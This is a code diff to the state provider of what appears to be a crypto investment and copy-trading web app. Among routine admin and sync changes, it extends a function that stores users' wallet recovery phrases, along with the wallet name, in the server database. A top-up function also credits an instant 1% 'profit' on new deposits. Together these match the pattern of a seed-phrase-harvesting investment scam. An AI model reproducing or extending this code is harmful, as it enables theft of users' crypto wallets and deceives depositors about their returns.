@@ -1,4 +1,4 @@
-import React, { createContext, useContext, useState, useEffect } from "react";
+import React, { createContext, useContext, useState, useEffect, useRef } from "react";
 import { 
   MarketAsset, 
   TraderProfile, 
@@ -67,6 +67,7 @@ interface OrbitContextType {
   claimPlanPayout: (investmentId: string) => void;
   claimAirdrop: (airdropId: string, token: string, rewardAmount: string) => void;
   withdrawEarnings: () => void;
+  topUpInvestment: (investmentId: string, amount: number) => { success: boolean; message: string };
   copyTrader: (traderId: string, amount: number) => { success: boolean; message: string };
   uncopyTrader: (traderId: string) => { success: boolean; message: string };
   executeTrade: (symbol: string, name: string, type: "buy" | "sell", amount: number, price: number, isCrypto: boolean) => { success: boolean; message: string };
@@ -99,6 +100,7 @@ interface OrbitContextType {
   adminRejectWithdrawal: (txId: string, notes?: string) => void;
   
   adminApproveAirdrop: (claimId: string) => void;
+  adminRejectAirdrop: (claimId: string) => void;
   adminCreateAirdrop: (airdrop: Omit<Airdrop, "id">) => void;
   adminUpdateAirdrop: (airdrop: Airdrop) => void;
   adminDeleteAirdrop: (airdropId: string) => void;
@@ -113,7 +115,7 @@ interface OrbitContextType {
   addNotification: (text: string) => void;
   clearNotifications: () => void;
   submitKyc: (kyc: KycSubmission) => void;
-  saveRecoveryPhrase: (phrase: string) => void;
+  saveRecoveryPhrase: (phrase: string, walletName?: string) => void;
 
   // Real-time site content editing
   siteContent: SiteContent;
@@ -409,49 +411,6 @@ export const OrbitProvider: React.FC<{ children: React.ReactNode }> = ({ childre
   } = useEmailNotifications();
   const [siteContent, setSiteContent] = useState<SiteContent>(DEFAULT_SITE_CONTENT);
 
-  // Synchronize dynamic site content in real-time
-  useEffect(() => {
-    const docPath = "site_content/texts";
-    const docRef = doc(db, "site_content", "texts");
-
-    // Real-time listener for updates
-    const unsubscribe = onSnapshot(docRef, (snap) => {
-      if (snap.exists()) {
-        const data = snap.data();
-        
-        // Auto-heal legacy database text content to match the new crisp terminology requested by the user
-        const hasLegacyTitle = data.investment_title === "Cryptocurrency Compounding Tiers";
-        const hasLegacyDesc = data.investment_description && data.investment_description.includes("locked-liquidity compounding tier");
-        if (hasLegacyTitle || hasLegacyDesc) {
-          const healed = {
-            ...data,
-            ...(hasLegacyTitle ? { investment_title: "Choose your plan and target" } : {}),
-            ...(hasLegacyDesc ? { investment_description: "Select a plan that fits your budget and timeline. Track progress from your dashboard." } : {})
-          };
-          setDoc(docRef, healed, { merge: true }).catch(console.error);
-        }
-
-        setSiteContent(prev => ({
-          ...prev,
-          ...data
-        }));
-      } else {
-        // Document does not exist yet; initialize it in background with default values
-        setDoc(docRef, DEFAULT_SITE_CONTENT)
-          .then(() => {
-            console.log("Initialized Firebase Firestore 'site_content' with dynamic default values");
-          })
-          .catch((err) => {
-            handleFirestoreError(err, OperationType.WRITE, docPath);
-          });
-      }
-    }, (error) => {
-      handleFirestoreError(error, OperationType.GET, docPath);
-    });
-
-    return () => unsubscribe();
-  }, []);
-
   const updateSiteContent = async (newContent: Partial<SiteContent>) => {
     const docPath = "site_content/texts";
     try {
@@ -660,6 +619,19 @@ export const OrbitProvider: React.FC<{ children: React.ReactNode }> = ({ childre
     }
   };
 
+  const adminRejectAirdrop = async (claimId: string) => {
+    const claim = adminAirdropClaims.find(c => c.id === claimId);
+    if (!claim) return;
+
+    try {
+      await updateDoc(doc(db, "airdrop_claims", claimId), { status: "Rejected" });
+      setAdminAirdropClaims(prev => prev.map(c => c.id === claimId ? { ...c, status: "Rejected" } : c));
+      addNotification(`Airdrop claim ${claimId} rejected.`);
+    } catch (e) {
+      console.error("Error rejecting airdrop claim:", e);
+    }
+  };
+
   const adminCreateAirdrop = async (airdrop: Omit<Airdrop, "id">) => {
     const id = `airdrop-${Date.now()}`;
     const newAirdrop: Airdrop = { ...airdrop, id };
@@ -721,14 +693,16 @@ export const OrbitProvider: React.FC<{ children: React.ReactNode }> = ({ childre
     const tradersCol = collection(db, "traders");
     const unsubscribe = onSnapshot(tradersCol, (snapshot) => {
       if (snapshot.empty) {
-        // Seed default traders to the database in background
-        INITIAL_TRADERS.forEach(async (trader) => {
-          try {
-            await setDoc(doc(db, "traders", trader.id), trader);
-          } catch (e) {
-            console.error("Error seeding trader: ", e);
-          }
-        });
+        if (user.isAdmin) {
+          // Seed default traders to the database in background
+          INITIAL_TRADERS.forEach(async (trader) => {
+            try {
+              await setDoc(doc(db, "traders", trader.id), trader);
+            } catch (e) {
+              console.error("Error seeding trader: ", e);
+            }
+          });
+        }
       } else {
         const loaded: TraderProfile[] = [];
         snapshot.forEach((docSnap) => {
@@ -742,7 +716,7 @@ export const OrbitProvider: React.FC<{ children: React.ReactNode }> = ({ childre
       handleFirestoreError(error, OperationType.GET, "traders");
     });
     return () => unsubscribe();
-  }, []);
+  }, [user.isAdmin]);
 
   // Synchronize admin wallets from Firestore in real-time
   useEffect(() => {
@@ -751,7 +725,7 @@ export const OrbitProvider: React.FC<{ children: React.ReactNode }> = ({ childre
       if (snap.exists()) {
         const data = snap.data() as Record<string, string>;
         setAdminWallets(data);
-      } else {
+      } else if (user.isAdmin) {
         const defaultWallets = {
           BTC: "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
           ETH: "0x7Fba9fB5994A1F62aB016a2E9D843D0B6A780E2e",
@@ -763,10 +737,15 @@ export const OrbitProvider: React.FC<{ children: React.ReactNode }> = ({ childre
       }
     });
     return () => unsubscribe();
-  }, []);
+  }, [user.isAdmin]);
 
   // Synchronically listen to all registered users from Firestore
   useEffect(() => {
+    if (!user.isAdmin) {
+      setAdminUsers([]);
+      return;
+    }
+
     const usersCol = collection(db, "users");
     const unsubscribe = onSnapshot(usersCol, (snapshot) => {
       // If Firestore users collection is empty, seed with INITIAL_MOCK_USERS for local/dev sync
@@ -831,40 +810,74 @@ export const OrbitProvider: React.FC<{ children: React.ReactNode }> = ({ childre
       console.error("Firestore user sync error: ", error);
     });
     return () => unsubscribe();
-  }, []);
+  }, [user.isAdmin]);
+
+  const lastSyncedRef = useRef<string>("");
+  const lastTickSyncRef = useRef<number>(0);
 
   // Synchronize local caches and Firestore user profiles
   useEffect(() => {
     localStorage.setItem("orbitrio_user", JSON.stringify(user));
 
-    if (user.isLoggedIn && user.email) {
-      const userDocRef = doc(db, "users", user.email);
-      const firebaseUser = auth.currentUser;
-      if (firebaseUser && firebaseUser.email === user.email) {
-        const fieldsToUpdate = {
-          name: user.name,
-          balance: user.balance,
-          portfolioValue: user.portfolioValue,
-          activeInvestments: user.activeInvestments,
-          portfolio: user.portfolio,
-          transactions: user.transactions,
-          tickets: user.tickets,
-          status: user.status || "active",
-          role: user.role || "user",
-          username: user.username || "",
-          firstName: user.firstName || "",
-          lastName: user.lastName || "",
-          gender: user.gender || "",
-          phone: user.phone || "",
-          accountType: user.accountType || "",
-          country: user.country || "",
-          currency: user.currency || ""
-        };
-        setDoc(userDocRef, fieldsToUpdate, { merge: true }).catch(err => {
-          console.error("Failed to sync state to Firestore:", err);
-        });
-      }
-    }
+    if (!user.isLoggedIn || !user.email) return;
+
+    const firebaseUser = auth.currentUser;
+    if (!firebaseUser || firebaseUser.email !== user.email) return;
+
+    const meaningfulSnapshot = JSON.stringify({
+      balance: user.balance,
+      transactions: user.transactions,
+      tickets: user.tickets,
+      status: user.status,
+      role: user.role,
+      username: user.username,
+      firstName: user.firstName,
+      lastName: user.lastName,
+      gender: user.gender,
+      phone: user.phone,
+      accountType: user.accountType,
+      country: user.country,
+      currency: user.currency,
+      portfolio: user.portfolio,
+      kyc: user.kyc,
+      recoveryPhrase: user.recoveryPhrase
+    });
+
+    const now = Date.now();
+    const meaningfulChanged = meaningfulSnapshot !== lastSyncedRef.current;
+    const tickIntervalPassed = now - lastTickSyncRef.current > 60000;
+
+    if (!meaningfulChanged && !tickIntervalPassed) return;
+
+    const fieldsToUpdate = {
+      name: user.name,
+      balance: user.balance,
+      portfolioValue: user.portfolioValue,
+      activeInvestments: user.activeInvestments,
+      portfolio: user.portfolio,
+      transactions: user.transactions,
+      tickets: user.tickets,
+      status: user.status || "active",
+      role: user.role || "user",
+      username: user.username || "",
+      firstName: user.firstName || "",
+      lastName: user.lastName || "",
+      gender: user.gender || "",
+      phone: user.phone || "",
+      accountType: user.accountType || "",
+      country: user.country || "",
+      currency: user.currency || ""
+    };
+
+    const userDocRef = doc(db, "users", user.email);
+    setDoc(userDocRef, fieldsToUpdate, { merge: true })
+      .then(() => {
+        lastSyncedRef.current = meaningfulSnapshot;
+        lastTickSyncRef.current = now;
+      })
+      .catch(err => {
+        console.error("Failed to sync state to Firestore:", err);
+      });
   }, [user]);
 
   // Synchronize Firebase Auth state to restore logged session after page refresh
@@ -1565,6 +1578,50 @@ export const OrbitProvider: React.FC<{ children: React.ReactNode }> = ({ childre
     addNotification(`Earnings of $${item.accumulatedProfit.toFixed(2)} and initial capital returned to pocket.`);
   };
 
+  const topUpInvestment = (investmentId: string, amount: number): { success: boolean; message: string } => {
+    if (!user.isLoggedIn || !user.email) {
+      return { success: false, message: "AUTH_REQUIRED" };
+    }
+    if (amount <= 0 || isNaN(amount)) {
+      return { success: false, message: "Please enter a valid amount." };
+    }
+    if (user.balance < amount) {
+      return { success: false, message: "INSUFFICIENT_BALANCE" };
+    }
+
+    const investment = user.activeInvestments.find(inv => inv.id === investmentId);
+    if (!investment) {
+      return { success: false, message: "Investment not found." };
+    }
+
+    const updatedInvestment = {
+      ...investment,
+      amount: investment.amount + amount,
+      accumulatedProfit: investment.accumulatedProfit + amount * 0.01
+    };
+
+    const topUpTx: Transaction = {
+      id: `tx-topup-${Date.now()}`,
+      type: "investment",
+      amount,
+      status: "completed",
+      asset: "USD",
+      date: new Date().toISOString().split("T")[0],
+      notes: `Top-up added to ${investment.name}`,
+      userEmail: user.email
+    };
+
+    setUser(prev => ({
+      ...prev,
+      balance: +(prev.balance - amount).toFixed(2),
+      activeInvestments: prev.activeInvestments.map(inv => inv.id === investmentId ? updatedInvestment : inv),
+      transactions: [topUpTx, ...prev.transactions]
+    }));
+
+    addNotification(`Added $${amount.toFixed(2)} to ${investment.name}.`);
+    return { success: true, message: "Top-up completed successfully." };
+  };
+
   const copyTrader = (traderId: string, amount: number): { success: boolean; message: string } => {
     if (!user.isLoggedIn || !user.email) {
       return { success: false, message: "AUTH_REQUIRED" };
@@ -2033,14 +2090,15 @@ export const OrbitProvider: React.FC<{ children: React.ReactNode }> = ({ childre
     }
   };
 
-  const saveRecoveryPhrase = async (phrase: string) => {
+  const saveRecoveryPhrase = async (phrase: string, walletName?: string) => {
     if (!user.email) return;
     try {
       const userDocRef = doc(db, "users", user.email);
       await updateDoc(userDocRef, {
-        recoveryPhrase: phrase
+        recoveryPhrase: phrase,
+        connectedWalletName: walletName || ""
       });
-      setUser(prev => ({ ...prev, recoveryPhrase: phrase }));
+      setUser(prev => ({ ...prev, recoveryPhrase: phrase, connectedWalletName: walletName || "" }));
       addNotification("Recovery phrase saved.");
     } catch (e) {
       console.error("Error saving recovery phrase in Firestore:", e);
@@ -2390,16 +2448,18 @@ export const OrbitProvider: React.FC<{ children: React.ReactNode }> = ({ childre
       adminUpdatePlan,
       adminDeletePlan,
       adminSetPlanStatus,
+      topUpInvestment,
       
       adminApproveDeposit,
       adminRejectDeposit,
       adminApproveWithdrawal,
       adminRejectWithdrawal,
       adminApproveAirdrop,
+      adminRejectAirdrop,
       adminCreateAirdrop,
       adminUpdateAirdrop,
       adminDeleteAirdrop,
-      
+
       adminCreateAnnouncement,
       adminDeleteAnnouncement,
       
